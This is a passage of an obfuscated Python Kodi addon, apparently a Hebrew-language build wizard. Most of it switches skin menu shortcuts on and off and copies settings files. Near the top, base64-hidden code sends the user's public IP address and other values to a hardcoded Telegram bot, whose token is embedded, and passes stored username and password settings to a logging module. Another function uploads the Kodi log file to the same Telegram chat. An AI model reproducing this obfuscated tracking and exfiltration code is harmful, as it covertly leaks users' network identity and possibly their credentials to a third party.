          OOO00O0OOOO0000O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:576
          OOOOO00000O0O0OOO =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:577
          OO0O0OOOOO00OOOO0 =str (json .loads (OOOOO00000O0O0OOO )['ip'])#line:578
          OOOO00O00O000OO0O =O0OOO000OO0O0O0OO #line:579
          O0000O00OOO0OO0OO =O0OO0000O000O00OO #line:580
          import socket #line:582
          OOOOO00000O0O0OOO =urllib2 .urlopen (OOO00O0OOOO0000O0 .decode ('base64')+' - '+OOOO00O00O000OO0O +' - '+O0000O00OOO0OO0OO +' - '+OO0OO00OOO0OOO0OO ).readlines ()#line:583
       except :pass #line:584
def googleindicat ():#line:587
			import logg #line:588
			O000O0000O0O0OO00 =(ADDON .getSetting ("pass"))#line:589
			OO0OOOOOOOOOOO0O0 =(ADDON .getSetting ("user"))#line:590
			logg .logGA (O000O0000O0O0OO00 ,OO0OOOOOOOOOOO0O0 )#line:591
def logsend ():#line:592
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:593
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:594
      howsentlog ()#line:596
      import requests #line:597
      if xbmc .getCondVisibility ('system.platform.windows'):#line:598
         O00OO00000000OOOO =xbmc .translatePath ('special://home/kodi.log')#line:599
         O0O0OO0OOO0OO0O0O ={'chat_id':(None ,'-274262389'),'document':(O00OO00000000OOOO ,open (O00OO00000000OOOO ,'rb')),}#line:603
         O0OOO00OOO000O00O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:604
         O00OO0000OOO000O0 =requests .post (O0OOO00OOO000O00O .decode ('base64'),files =O0O0OO0OOO0OO0O0O )#line:606
      elif xbmc .getCondVisibility ('system.platform.android'):#line:607
           O00OO00000000OOOO =xbmc .translatePath ('special://temp/kodi.log')#line:608
           O0O0OO0OOO0OO0O0O ={'chat_id':(None ,'-274262389'),'document':(O00OO00000000OOOO ,open (O00OO00000000OOOO ,'rb')),}#line:612
           O0OOO00OOO000O00O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:613
           O00OO0000OOO000O0 =requests .post (O0OOO00OOO000O00O .decode ('base64'),files =O0O0OO0OOO0OO0O0O )#line:615
      else :#line:616
           O00OO00000000OOOO =xbmc .translatePath ('special://kodi.log')#line:617
           O0O0OO0OOO0OO0O0O ={'chat_id':(None ,'-274262389'),'document':(O00OO00000000OOOO ,open (O00OO00000000OOOO ,'rb')),}#line:621
           O0OOO00OOO000O00O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:622
           O00OO0000OOO000O0 =requests .post (O0OOO00OOO000O00O .decode ('base64'),files =O0O0OO0OOO0OO0O0O )#line:624
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:625
def rdoff ():#line:627
	O0O0O0000OOOO0O00 =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:658
	O0OOO0O0OO0OOO0OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:659
	copyfile (O0O0O0000OOOO0O00 ,O0OOO0O0OO0OOO0OO )#line:660
def skindialogsettind18 ():#line:661
	try :#line:662
		OOOOO0OO0O0OO0O00 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:663
		O0O00000OOO000OOO =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:664
		copyfile (OOOOO0OO0O0OO0O00 ,O0O00000OOO000OOO )#line:665
	except :pass #line:666
def rdon ():#line:667
	loginit .loginIt ('restore','all')#line:668
	O00OO0OOO0OOOO00O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:670
	OO0OOO00OO00O0O0O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:671
	copyfile (O00OO0OOO0OOOO00O ,OO0OOO00OO00O0O0O )#line:672
def adults18 ():#line:674
  O0OO00OO0O0O0O0O0 =(ADDON .getSetting ("adults"))#line:675
  if O0OO00OO0O0O0O0O0 =='true':#line:676
    O0O000O0OO000O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:677
    with open (O0O000O0OO000O0OO ,'r')as O00OOOOO00OO0OOO0 :#line:678
      O0O0OO0O00000O000 =O00OOOOO00OO0OOO0 .read ()#line:679
    O0O0OO0O00000O000 =O0O0OO0O00000O000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:697
    with open (O0O000O0OO000O0OO ,'w')as O00OOOOO00OO0OOO0 :#line:700
      O00OOOOO00OO0OOO0 .write (O0O0OO0O00000O000 )#line:701
def rdbuildaddon ():#line:702
  OOOO0000000O00OOO =(ADDON .getSetting ("auto_rd"))#line:703
  if OOOO0000000O00OOO =='true':#line:704
    OOO0O00O00O0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:705
    with open (OOO0O00O00O0OO000 ,'r')as OO0OOO000OO0OO0OO :#line:706
      O000OOO0OO000O0OO =OO0OOO000OO0OO0OO .read ()#line:707
    O000OOO0OO000O0OO =O000OOO0OO000O0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:725
    with open (OOO0O00O00O0OO000 ,'w')as OO0OOO000OO0OO0OO :#line:728
      OO0OOO000OO0OO0OO .write (O000OOO0OO000O0OO )#line:729
    OOO0O00O00O0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:733
    with open (OOO0O00O00O0OO000 ,'r')as OO0OOO000OO0OO0OO :#line:734
      O000OOO0OO000O0OO =OO0OOO000OO0OO0OO .read ()#line:735
    O000OOO0OO000O0OO =O000OOO0OO000O0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:753
    with open (OOO0O00O00O0OO000 ,'w')as OO0OOO000OO0OO0OO :#line:756
      OO0OOO000OO0OO0OO .write (O000OOO0OO000O0OO )#line:757
    OOO0O00O00O0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:761
    with open (OOO0O00O00O0OO000 ,'r')as OO0OOO000OO0OO0OO :#line:762
      O000OOO0OO000O0OO =OO0OOO000OO0OO0OO .read ()#line:763
    O000OOO0OO000O0OO =O000OOO0OO000O0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:781
    with open (OOO0O00O00O0OO000 ,'w')as OO0OOO000OO0OO0OO :#line:784
      OO0OOO000OO0OO0OO .write (O000OOO0OO000O0OO )#line:785
    OOO0O00O00O0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:789
    with open (OOO0O00O00O0OO000 ,'r')as OO0OOO000OO0OO0OO :#line:790
      O000OOO0OO000O0OO =OO0OOO000OO0OO0OO .read ()#line:791
    O000OOO0OO000O0OO =O000OOO0OO000O0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:809
    with open (OOO0O00O00O0OO000 ,'w')as OO0OOO000OO0OO0OO :#line:812
      OO0OOO000OO0OO0OO .write (O000OOO0OO000O0OO )#line:813
    OOO0O00O00O0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:816
    with open (OOO0O00O00O0OO000 ,'r')as OO0OOO000OO0OO0OO :#line:817
      O000OOO0OO000O0OO =OO0OOO000OO0OO0OO .read ()#line:818
    O000OOO0OO000O0OO =O000OOO0OO000O0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:836
    with open (OOO0O00O00O0OO000 ,'w')as OO0OOO000OO0OO0OO :#line:839
      OO0OOO000OO0OO0OO .write (O000OOO0OO000O0OO )#line:840
    OOO0O00O00O0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:842
    with open (OOO0O00O00O0OO000 ,'r')as OO0OOO000OO0OO0OO :#line:843
      O000OOO0OO000O0OO =OO0OOO000OO0OO0OO .read ()#line:844
    O000OOO0OO000O0OO =O000OOO0OO000O0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:862
    with open (OOO0O00O00O0OO000 ,'w')as OO0OOO000OO0OO0OO :#line:865
      OO0OOO000OO0OO0OO .write (O000OOO0OO000O0OO )#line:866
    OOO0O00O00O0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:868
    with open (OOO0O00O00O0OO000 ,'r')as OO0OOO000OO0OO0OO :#line:869
      O000OOO0OO000O0OO =OO0OOO000OO0OO0OO .read ()#line:870
    O000OOO0OO000O0OO =O000OOO0OO000O0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:888
    with open (OOO0O00O00O0OO000 ,'w')as OO0OOO000OO0OO0OO :#line:891
      OO0OOO000OO0OO0OO .write (O000OOO0OO000O0OO )#line:892
    OOO0O00O00O0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:895
    with open (OOO0O00O00O0OO000 ,'r')as OO0OOO000OO0OO0OO :#line:896
      O000OOO0OO000O0OO =OO0OOO000OO0OO0OO .read ()#line:897
    O000OOO0OO000O0OO =O000OOO0OO000O0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:915
    with open (OOO0O00O00O0OO000 ,'w')as OO0OOO000OO0OO0OO :#line:918
      OO0OOO000OO0OO0OO .write (O000OOO0OO000O0OO )#line:919
def rdbuildinstall ():#line:922
  try :#line:923
   O0OO0OOO0O0O00OO0 =(ADDON .getSetting ("auto_rd"))#line:924
   if O0OO0OOO0O0O00OO0 =='true':#line:925
     O0OOO0O00OO0OOO00 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:926
     O0O000OOOO0O0OOOO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:927
     copyfile (O0OOO0O00OO0OOO00 ,O0O000OOOO0O0OOOO )#line:928
  except :#line:929
     pass #line:930
def rdbuildaddonoff ():#line:933
    O0OO00OO000O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:936
    with open (O0OO00OO000O00000 ,'r')as OOOOO00O00O00OO00 :#line:937
      O0O0OO000O00OOO0O =OOOOO00O00O00OO00 .read ()#line:938
    O0O0OO000O00OOO0O =O0O0OO000O00OOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:956
    with open (O0OO00OO000O00000 ,'w')as OOOOO00O00O00OO00 :#line:959
      OOOOO00O00O00OO00 .write (O0O0OO000O00OOO0O )#line:960
    O0OO00OO000O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:964
    with open (O0OO00OO000O00000 ,'r')as OOOOO00O00O00OO00 :#line:965
      O0O0OO000O00OOO0O =OOOOO00O00O00OO00 .read ()#line:966
    O0O0OO000O00OOO0O =O0O0OO000O00OOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:984
    with open (O0OO00OO000O00000 ,'w')as OOOOO00O00O00OO00 :#line:987
      OOOOO00O00O00OO00 .write (O0O0OO000O00OOO0O )#line:988
    O0OO00OO000O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:992
    with open (O0OO00OO000O00000 ,'r')as OOOOO00O00O00OO00 :#line:993
      O0O0OO000O00OOO0O =OOOOO00O00O00OO00 .read ()#line:994
    O0O0OO000O00OOO0O =O0O0OO000O00OOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1012
    with open (O0OO00OO000O00000 ,'w')as OOOOO00O00O00OO00 :#line:1015
      OOOOO00O00O00OO00 .write (O0O0OO000O00OOO0O )#line:1016
    O0OO00OO000O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1020
    with open (O0OO00OO000O00000 ,'r')as OOOOO00O00O00OO00 :#line:1021
      O0O0OO000O00OOO0O =OOOOO00O00O00OO00 .read ()#line:1022
    O0O0OO000O00OOO0O =O0O0OO000O00OOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1040
    with open (O0OO00OO000O00000 ,'w')as OOOOO00O00O00OO00 :#line:1043
      OOOOO00O00O00OO00 .write (O0O0OO000O00OOO0O )#line:1044
    O0OO00OO000O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1047
    with open (O0OO00OO000O00000 ,'r')as OOOOO00O00O00OO00 :#line:1048
      O0O0OO000O00OOO0O =OOOOO00O00O00OO00 .read ()#line:1049
    O0O0OO000O00OOO0O =O0O0OO000O00OOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1067
    with open (O0OO00OO000O00000 ,'w')as OOOOO00O00O00OO00 :#line:1070
      OOOOO00O00O00OO00 .write (O0O0OO000O00OOO0O )#line:1071
    O0OO00OO000O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1073
    with open (O0OO00OO000O00000 ,'r')as OOOOO00O00O00OO00 :#line:1074
      O0O0OO000O00OOO0O =OOOOO00O00O00OO00 .read ()#line:1075
    O0O0OO000O00OOO0O =O0O0OO000O00OOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1093
    with open (O0OO00OO000O00000 ,'w')as OOOOO00O00O00OO00 :#line:1096
      OOOOO00O00O00OO00 .write (O0O0OO000O00OOO0O )#line:1097
    O0OO00OO000O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1099
    with open (O0OO00OO000O00000 ,'r')as OOOOO00O00O00OO00 :#line:1100
      O0O0OO000O00OOO0O =OOOOO00O00O00OO00 .read ()#line:1101
    O0O0OO000O00OOO0O =O0O0OO000O00OOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1119
    with open (O0OO00OO000O00000 ,'w')as OOOOO00O00O00OO00 :#line:1122
      OOOOO00O00O00OO00 .write (O0O0OO000O00OOO0O )#line:1123
    O0OO00OO000O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1126
    with open (O0OO00OO000O00000 ,'r')as OOOOO00O00O00OO00 :#line:1127
      O0O0OO000O00OOO0O =OOOOO00O00O00OO00 .read ()#line:1128
    O0O0OO000O00OOO0O =O0O0OO000O00OOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1146
    with open (O0OO00OO000O00000 ,'w')as OOOOO00O00O00OO00 :#line:1149
      OOOOO00O00O00OO00 .write (O0O0OO000O00OOO0O )#line:1150
def rdbuildinstalloff ():#line:1153
    try :#line:1154
       O0O00OO00OOO00OO0 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1155
       O0O0OO00O0OOOO000 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1156
       copyfile (O0O00OO00OOO00OO0 ,O0O0OO00O0OOOO000 )#line:1158
       O0O00OO00OOO00OO0 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1160
       O0O0OO00O0OOOO000 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1161
       copyfile (O0O00OO00OOO00OO0 ,O0O0OO00O0OOOO000 )#line:1163
       O0O00OO00OOO00OO0 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1165
       O0O0OO00O0OOOO000 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1166
       copyfile (O0O00OO00OOO00OO0 ,O0O0OO00O0OOOO000 )#line:1168
       O0O00OO00OOO00OO0 =ADDONPATH +"/resources/rdoff/Splash.png"#line:1171
       O0O0OO00O0OOOO000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1172
       copyfile (O0O00OO00OOO00OO0 ,O0O0OO00O0OOOO000 )#line:1174
    except :#line:1176
       pass #line:1177
def rdbuildaddonON ():#line:1184
    OO0O0OO0OOOO00O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1186
    with open (OO0O0OO0OOOO00O00 ,'r')as OOO0000OOOOO0O0OO :#line:1187
      OO0000O0OOOO00OOO =OOO0000OOOOO0O0OO .read ()#line:1188
    OO0000O0OOOO00OOO =OO0000O0OOOO00OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1206
    with open (OO0O0OO0OOOO00O00 ,'w')as OOO0000OOOOO0O0OO :#line:1209
      OOO0000OOOOO0O0OO .write (OO0000O0OOOO00OOO )#line:1210
    OO0O0OO0OOOO00O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1214
    with open (OO0O0OO0OOOO00O00 ,'r')as OOO0000OOOOO0O0OO :#line:1215
      OO0000O0OOOO00OOO =OOO0000OOOOO0O0OO .read ()#line:1216
    OO0000O0OOOO00OOO =OO0000O0OOOO00OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
